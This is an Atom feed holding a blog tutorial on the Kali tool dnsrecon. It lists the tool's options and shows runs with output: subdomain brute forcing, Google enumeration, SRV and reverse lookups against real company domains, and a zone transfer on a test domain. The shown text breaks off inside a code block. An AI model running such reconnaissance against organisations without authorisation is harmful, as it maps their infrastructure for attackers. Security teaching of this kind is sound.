<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Core dump overflow]]></title>
  <link href="http://chousensha.github.io/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-07-15T09:09:32-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[dnsrecon - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/12/dnsrecon-kali-linux-tools/"/>
    <updated>2017-07-12T14:41:27-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/12/dnsrecon-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: perform thorough DNS enumeration and subdomain bruteforcing on a target. dnsrecon is true to its name, it&rsquo;s written in Python, and judging from the number of stars on its Github repository, it&rsquo;s a much more popular choice than the other candidates in Kali&rsquo;s DNS section.</p>

<p>Homepage: <a href="https://github.com/darkoperator/dnsrecon">https://github.com/darkoperator/dnsrecon</a></p>

<!-- more -->


<h2>dnsrecon description</h2>

<blockquote><p>This script provides the ability to perform:</p>

<p>Check all NS Records for Zone Transfers.</p>

<p>Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT).</p>

<p>Perform common SRV Record Enumeration.</p>

<p>Top Level Domain (TLD) Expansion.</p>

<p>Check for Wildcard Resolution.</p>

<p>Brute Force subdomain and host A and AAAA records given a domain and a wordlist.</p>

<p>Perform a PTR Record lookup for a given IP Range or CIDR.</p>

<p>Check a DNS Server Cached records for A, AAAA and CNAME Records provided a list of host records in a text file to
check.</p>

<p>Enumerate Common mDNS records in the Local Network</p>

<p>Enumerate Hosts and Subdomains using Google</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/zesty/man1/dnsrecon.1.html">http://manpages.ubuntu.com/manpages/zesty/man1/dnsrecon.1.html</a></p>

<h2>dnsrecon options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Version: 0.8.10
</span><span class='line'>Usage: dnsrecon.py &lt;options&gt;
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>   -h, --help                   Show this help message and exit.
</span><span class='line'>   -d, --domain      &lt;domain&gt;   Target domain.
</span><span class='line'>   -r, --range       &lt;range&gt;    IP range for reverse lookup brute force in formats (first-last) or in (range/bitmask).
</span><span class='line'>   -n, --name_server &lt;name&gt;     Domain server to use. If none is given, the SOA of the target will be used.
</span><span class='line'>   -D, --dictionary  &lt;file&gt;     Dictionary file of subdomain and hostnames to use for brute force.
</span><span class='line'>   -f                           Filter out of brute force domain lookup, records that resolve to the wildcard defined
</span><span class='line'>                                IP address when saving records.
</span><span class='line'>   -t, --type        &lt;types&gt;    Type of enumeration to perform:
</span><span class='line'>                                std       SOA, NS, A, AAAA, MX and SRV if AXRF on the NS servers fail.
</span><span class='line'>                                rvl       Reverse lookup of a given CIDR or IP range.
</span><span class='line'>                                brt       Brute force domains and hosts using a given dictionary.
</span><span class='line'>                                srv       SRV records.
</span><span class='line'>                                axfr      Test all NS servers for a zone transfer.
</span><span class='line'>                                goo       Perform Google search for subdomains and hosts.
</span><span class='line'>                                snoop     Perform cache snooping against all NS servers for a given domain, testing
</span><span class='line'>                                          all with file containing the domains, file given with -D option.
</span><span class='line'>                                tld       Remove the TLD of given domain and test against all TLDs registered in IANA.
</span><span class='line'>                                zonewalk  Perform a DNSSEC zone walk using NSEC records.
</span><span class='line'>   -a                           Perform AXFR with standard enumeration.
</span><span class='line'>   -s                           Perform a reverse lookup of IPv4 ranges in the SPF record with standard enumeration.
</span><span class='line'>   -g                           Perform Google enumeration with standard enumeration.
</span><span class='line'>   -w                           Perform deep whois record analysis and reverse lookup of IP ranges found through
</span><span class='line'>                                Whois when doing a standard enumeration.
</span><span class='line'>   -z                           Performs a DNSSEC zone walk with standard enumeration.
</span><span class='line'>   --threads         &lt;number&gt;   Number of threads to use in reverse lookups, forward lookups, brute force and SRV
</span><span class='line'>                                record enumeration.
</span><span class='line'>   --lifetime        &lt;number&gt;   Time to wait for a server to response to a query.
</span><span class='line'>   --db              &lt;file&gt;     SQLite 3 file to save found records.
</span><span class='line'>   --xml             &lt;file&gt;     XML file to save found records.
</span><span class='line'>   --iw                         Continue brute forcing a domain even if a wildcard records are discovered.
</span><span class='line'>   -c, --csv         &lt;file&gt;     Comma separated value file.
</span><span class='line'>   -j, --json        &lt;file&gt;     JSON file.
</span><span class='line'>   -v                           Show attempts in the brute force modes.</span></code></pre></td></tr></table></div></figure>


<h2>dnsrecon usage</h2>

<ul>
<li>general enumeration</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d asterisk.org
</span><span class='line'>[*] Performing General Enumeration of Domain: asterisk.org
</span><span class='line'>[-] DNSSEC is not configured for asterisk.org
</span><span class='line'>[*]    SOA ns.digium.com 216.207.245.18
</span><span class='line'>[*]    NS nsx3.digium.com 166.78.177.30
</span><span class='line'>[*]    Bind Version for 166.78.177.30 9.8.4-rpz2+rl005.12-P1
</span><span class='line'>[*]    NS nsx2.digium.com 216.207.245.19
</span><span class='line'>[*]    Bind Version for 216.207.245.19 9.8.1-P1
</span><span class='line'>[*]    NS nsx1.digium.com 216.207.245.18
</span><span class='line'>[*]    Bind Version for 216.207.245.18 9.8.1-P1
</span><span class='line'>[*]    MX mail.digium.com 216.207.245.2
</span><span class='line'>[*]    A asterisk.org 216.207.245.25
</span><span class='line'>[*] Enumerating SRV Records
</span><span class='line'>[*]    SRV _sip._udp.asterisk.org sip.asterisk.org 204.91.156.60 5060 0
</span><span class='line'>[*] 1 Records Found</span></code></pre></td></tr></table></div></figure>


<p>For this example I selected a site that would also have SRV records. These records help with identifying certain services, in this case SIP for VoIP. Here you can see SIP being used on port 5060 on the host with the address 204.91.156.60.</p>

<ul>
<li>perform Google search enumeration</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d uber.com -g
</span><span class='line'>[*] Performing General Enumeration of Domain: uber.com
</span><span class='line'>[-] DNSSEC is not configured for uber.com
</span><span class='line'>[*]    SOA pdns80.ultradns.com 156.154.64.80
</span><span class='line'>[*]    NS pdns80.ultradns.net 156.154.65.80
</span><span class='line'>[*]    Bind Version for 156.154.65.80 UltraDNS Resolver
</span><span class='line'>[*]    NS pdns80.ultradns.net 2610:a1:1014::74
</span><span class='line'>[*]    NS pdns80.ultradns.biz 156.154.66.80
</span><span class='line'>[*]    Bind Version for 156.154.66.80 UltraDNS Resolver
</span><span class='line'>[*]    NS pdns80.ultradns.biz 2610:a1:1015::74
</span><span class='line'>[*]    NS pdns80.ultradns.org 156.154.67.80
</span><span class='line'>[*]    Bind Version for 156.154.67.80 UltraDNS Resolver
</span><span class='line'>[*]    NS pdns80.ultradns.org 2001:502:4612::74
</span><span class='line'>[*]    NS pdns80.ultradns.com 156.154.64.80
</span><span class='line'>[*]    Bind Version for 156.154.64.80 UltraDNS Resolver
</span><span class='line'>[*]    NS pdns80.ultradns.com 2001:502:f3ff::74
</span><span class='line'>[*]    MX alt4.aspmx.l.google.com 74.125.28.27
</span><span class='line'>[*]    MX alt2.aspmx.l.google.com 74.125.200.26
</span><span class='line'>[*]    MX alt3.aspmx.l.google.com 74.125.23.26
</span><span class='line'>[*]    MX alt1.aspmx.l.google.com 64.233.161.27
</span><span class='line'>[*]    MX aspmx.l.google.com 64.233.167.26
</span><span class='line'>[*]    MX alt4.aspmx.l.google.com 2607:f8b0:400e:c04::1a
</span><span class='line'>[*]    MX alt2.aspmx.l.google.com 2404:6800:4003:c00::1b
</span><span class='line'>[*]    MX alt3.aspmx.l.google.com 2404:6800:4008:c02::1a
</span><span class='line'>[*]    MX alt1.aspmx.l.google.com 2a00:1450:4010:c01::1b
</span><span class='line'>[*]    MX aspmx.l.google.com 2a00:1450:400c:c0c::1b
</span><span class='line'>[*]    A uber.com 104.36.192.133
</span><span class='line'>[*]    A uber.com 104.36.192.221
</span><span class='line'>[*]    A uber.com 104.36.192.183
</span><span class='line'>[*]    A uber.com 104.36.192.132
</span><span class='line'>[*]    A uber.com 104.36.192.135
</span><span class='line'>[*]    A uber.com 104.36.192.220
</span><span class='line'>[*]    A uber.com 104.36.192.182
</span><span class='line'>[*]    TXT uber.com v=spf1 include:uber.com._nspf.vali.email include:%{i}._ip.%{h}._ehlo.%{d}._spf.vali.email ~all
</span><span class='line'>[*]    TXT uber.com google-site-verification=pO8Bhyhw0N0939yKp6cQICCpvY--sebhQKWGviAkuLM
</span><span class='line'>[*]    TXT uber.com docusign=635f0402-4f58-42de-8e07-e1da6d8a971a
</span><span class='line'>[*] Enumerating SRV Records
</span><span class='line'>[*]    SRV _kerberos._udp.uber.com kerberos.uber.com 10.6.0.74 88 0
</span><span class='line'>[*]    SRV _kpasswd._udp.uber.com kerberos.uber.com 10.6.0.74 464 0
</span><span class='line'>[*] 2 Records Found
</span><span class='line'>[*] Performing Google Search Enumeration
</span><span class='line'>[*]    CNAME www.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    CNAME help.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    CNAME ride.uber.com d3b8kpte4epqc9.cloudfront.net
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.6
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.61
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.99
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.205
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.188
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.243
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.77
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.181
</span><span class='line'>[*]    CNAME bonjour.uber.com frontends-geo.uber.com
</span><span class='line'>[*]    CNAME frontends-geo.uber.com geo-frontends-dca1.uber.com
</span><span class='line'>[*]    CNAME geo-frontends-dca1.uber.com frontends-dca1.uber.com
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.234
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.160
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.133
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.131
</span><span class='line'>[*]    CNAME accessibility.uber.com uberpolicy.wpengine.com
</span><span class='line'>[*]    A uberpolicy.wpengine.com 35.184.61.224
</span><span class='line'>[*]    CNAME drive.uber.com uberdrive.wpengine.com
</span><span class='line'>[*]    A uberdrive.wpengine.com 35.184.61.224
</span><span class='line'>[*]    CNAME central.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    CNAME dial.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    CNAME developer.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    CNAME t.uber.com ghs.google.com
</span><span class='line'>[*]    CNAME ghs.google.com ghs.l.google.com
</span><span class='line'>[*]    A ghs.l.google.com 172.217.16.179
</span><span class='line'>[*]    CNAME t.uber.com ghs.google.com
</span><span class='line'>[*]    CNAME ghs.google.com ghs.l.google.com
</span><span class='line'>[*]    AAAA ghs.l.google.com 2a00:1450:4001:817::2013
</span><span class='line'>[*]    CNAME newsroom.uber.com ubernewblog.wpengine.com
</span><span class='line'>[*]    A ubernewblog.wpengine.com 35.184.61.224
</span><span class='line'>[*]    CNAME rush.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    CNAME join.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A pages.et.uber.com 198.245.92.62
</span><span class='line'>[*]    CNAME get.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    CNAME freight.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    CNAME eng.uber.com ubereng.wpengine.com
</span><span class='line'>[*]    A ubereng.wpengine.com 35.184.61.224
</span><span class='line'>[*]    CNAME movement.uber.com frontends-geo.uber.com
</span><span class='line'>[*]    CNAME frontends-geo.uber.com geo-frontends-dca1.uber.com
</span><span class='line'>[*]    CNAME geo-frontends-dca1.uber.com frontends-dca1.uber.com
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.234
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.160
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.131
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.133
</span><span class='line'>[*]    CNAME m.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*] 98 Records Found</span></code></pre></td></tr></table></div></figure>


<ul>
<li>pull SRV records of domain</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d cisco.com -t srv
</span><span class='line'>[*] Enumerating Common SRV Records against cisco.com
</span><span class='line'>[*]    SRV _sip._tcp.cisco.com vcsgw.cisco.com 173.36.224.91 5060 10
</span><span class='line'>[*]    SRV _sips._tcp.cisco.com vcsgw.cisco.com 173.36.224.91 5061 10
</span><span class='line'>[*]    SRV _h323ls._udp.cisco.com vcsgw.cisco.com 173.36.224.91 1719 10
</span><span class='line'>[*]    SRV _sip._udp.cisco.com vcsgw.cisco.com 173.36.224.91 5060 10
</span><span class='line'>[*]    SRV _h323cs._tcp.cisco.com vcsgw.cisco.com 173.36.224.91 1720 10
</span><span class='line'>[*]    SRV _xmpp-client._tcp.cisco.com isj3cmx.webexconnect.com 66.163.36.181 5222 1
</span><span class='line'>[*]    SRV _xmpp-server._tcp.cisco.com isj3jxf.webexconnect.com 66.163.36.186 5269 1
</span><span class='line'>[*] 7 Records Found</span></code></pre></td></tr></table></div></figure>


<ul>
<li>domain bruteforcing</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -D /usr/share/wordlists/dnsmap.txt -t brt -d line.me
</span><span class='line'>[*] Performing host and subdomain brute force against line.me
</span><span class='line'>[*]    A ads.line.me 203.104.153.62
</span><span class='line'>[*]    A agp.line.me 203.104.153.74
</span><span class='line'>[*]    CNAME api.line.me api.line.me.akadns.net
</span><span class='line'>[*]    CNAME api.line.me.akadns.net im.api.line.me.edgekey.net
</span><span class='line'>[*]    CNAME im.api.line.me.edgekey.net e1102.a1.akamaiedge.net
</span><span class='line'>[*]    A e1102.a1.akamaiedge.net 2.17.116.42
</span><span class='line'>[*]    A biz.line.me 125.6.149.168
</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>reverse lookup</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d nmap.org -w
</span><span class='line'>[...]
</span><span class='line'>[*] Performing Whois lookup against records found.
</span><span class='line'>[*] The following IP Ranges where found:
</span><span class='line'>[*]    0) 162.158.0.0-162.159.255.255 Cloudflare, Inc.
</span><span class='line'>[*]    1) 74.125.0.0-74.125.255.255 Google Inc.
</span><span class='line'>[*]    2) 64.233.160.0-64.233.191.255 Google Inc.
</span><span class='line'>[*]    3) 45.33.0.0-45.33.127.255 Linode
</span><span class='line'>[*] What Range do you wish to do a Revers Lookup for?
</span><span class='line'>[*] number, comma separated list, a for all or n for none
</span><span class='line'>3
</span><span class='line'>[*] Linode
</span><span class='line'>[*] Performing Reverse Lookup of range 45.33.0.0-45.33.127.255
</span><span class='line'>[*] Performing Reverse Lookup from 45.33.0.0 to 45.33.127.255
</span><span class='line'>[*]    PTR li954-9.members.linode.com 45.33.0.9
</span><span class='line'>[*]    PTR li954-4.members.linode.com 45.33.0.4
</span><span class='line'>[*]    PTR gw-li954.linode.com 45.33.0.1
</span><span class='line'>[*]    PTR li954-7.members.linode.com 45.33.0.7
</span><span class='line'>[*]    PTR cloud521.configrapp.com 45.33.0.8
</span><span class='line'>[*]    PTR mr2.linode.rbkmoney.net 45.33.0.10
</span><span class='line'>[*]    PTR li954-5.members.linode.com 45.33.0.5
</span><span class='line'>[*]    PTR rqdq.net 45.33.0.6
</span><span class='line'>[*]    PTR li954-12.members.linode.com 45.33.0.12
</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>working zone transfer</li>
</ul>


<p><a href="https://digi.ninja/projects/zonetransferme.php">Robin Wood</a> has been nice enough to register a domain that allows zone transfers for testing purposes. It&rsquo;s called zonetransfer.me, and here we&rsquo;ll look at partial output from one of the name servers:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
